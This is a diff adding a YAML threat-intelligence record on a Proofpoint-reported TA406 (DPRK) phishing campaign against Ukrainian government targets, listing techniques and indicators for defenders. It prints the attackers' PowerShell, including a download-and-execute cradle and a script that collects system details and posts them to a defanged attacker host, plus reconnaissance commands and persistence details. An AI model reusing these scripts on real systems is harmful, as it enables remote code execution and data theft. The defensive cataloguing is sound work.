@@ -1,0 +1,71 @@
+description: TA406, a DPRK state-sponsored actor (also known as Opal Sleet and Konni),
+  is targeting government entities in Ukraine with phishing campaigns delivering credential
+  harvesting attempts and malware to gather intelligence on the Russian invasion.
+date: 2025-05-13
+authors:
+- Greg Lesnewich
+- Saher Naumaan
+- Mark Kelly
+- The Proofpoint Threat Research Team
+attribution:
+- TA406
+- DPRK
+- Opal Sleet
+- Konni
+TTPs:
+- processs:
+  - powershell.exe
+  - cmd.exe
+  - wmiprvse.exe
+  - rundll32.exe
+- commandline:
+  - powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\state.bat
+  - cmd.exe /c ipconfig /all
+  - cmd.exe /c systeminfo
+  - wmic product get name, version
+  - rundll32.exe advapi32.dll,ProcessIdleTasks
+- powershell:
+  - '$webRequest = New-Object System.Net.WebClient
+
+    $response = $webRequest.DownloadString("hxxp://pokijhgcfsdfghnj.mywebcommunity[.]org/main/test.txt")
+
+    Invoke-Expression $response'
+  - '$webRequest = New-Object System.Net.WebClient
+
+    $response = $webRequest.DownloadString("hxxps://lorica[.]com.ua/MFA/.zip")
+
+    # No further PowerShell code provided for this download'
+  - "$data = @(\n  \"ipconfig /all\",\n  \"systeminfo\",\n  \"wmic product get name,\
+    \ version\"\n)\n$concatenatedData = $data -join \"`n\"\n$base64EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($concatenatedData))\n\
+    $webRequest = New-Object System.Net.WebClient\n$webRequest.Headers.Add(\"Content-Type\"\
+    , \"application/x-www-form-urlencoded\")\n$postData = @{ data = $base64EncodedData\
+    \ }\n$response = $webRequest.UploadString(\"hxxp://pokijhgcfsdfghnj.mywebcommunity[.]org/main/receive.php\"\
+    , \"POST\", $postData)\n"
+  - '# LNK file decoded PowerShell (Base64 encoded) - No full code provided, only
+    mention of execution'
+- scripting_engine:
+  - VBScript
+  - JScript
+- registry_keys: []
+- network_connections: []
+- file_modifications:
+  - C:\Users\Public\state.bat
+  - C:\Users\%APPDATA%\state.bat
+- persistence:
+  - Autorun entry for 'state.bat' in the APPDATA folder.
+- pipes: []
+- process_relations: []
+IOCs:
+- hashes: []
+- ips: []
+- domains:
+  - pokijhgcfsdfghnj.mywebcommunity[.]org
+  - lorica[.]com.ua
+  - jetmf[.]com
+- urls:
+  - hxxp://pokijhgcfsdfghnj.mywebcommunity[.]org/main/test.txt
+  - hxxp://pokijhgcfsdfghnj.mywebcommunity[.]org/main/receive.php
+  - hxxps://lorica[.]com.ua/MFA/.zip
+  - jetmf[.]com
+reference: https://www.proofpoint.com/us/blog/threat-insight/ta406-pivots-front
+file_creation_date: May 13, 2025
